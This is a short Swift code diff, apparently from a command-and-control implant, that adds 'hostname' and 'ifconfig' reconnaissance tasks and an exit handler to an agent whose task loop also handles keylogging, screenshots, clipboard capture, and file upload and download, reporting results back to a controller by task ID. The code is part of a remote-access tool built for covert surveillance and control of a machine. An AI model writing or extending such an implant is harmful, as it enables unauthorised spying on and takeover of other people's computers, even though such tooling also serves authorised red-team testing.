@@ -242,6 +242,10 @@ func executeTask(job: Job, jobList: JobList) {
         mv(job: job)
     case "cp":
         cp(job: job)
+    case "hostname":
+        hostname(job: job)
+    case "ifconfig":
+        ifconfig(job: job)
     default:
         job.result = "Command not implemented."
         job.status = "error"
@@ -392,9 +396,13 @@ func postResponse(jobList: JobList) {
                 // Found a job that succeeded and matched with task_id
                 if responses["task_id"].stringValue == job.taskID {
                     // Delete job if it is a "normal" job
-                    if ((job.command != "download") && (job.command != "upload") && (job.command != "screenshot") && (job.command != "keylog") && (job.command != "clipboard")) {
+                    if ((job.command != "download") && (job.command != "upload") && (job.command != "screenshot") && (job.command != "keylog") && (job.command != "clipboard") && (job.command != "exit")) {
                         jobList.jobs.remove(at: index)
                         print("job removed")
+                    }
+                    // Handle exit responses
+                    else if job.command == "exit" {
+                        exit(0)
                     }
                     // Handle screenshot responses
                     else if job.command == "screenshot" {
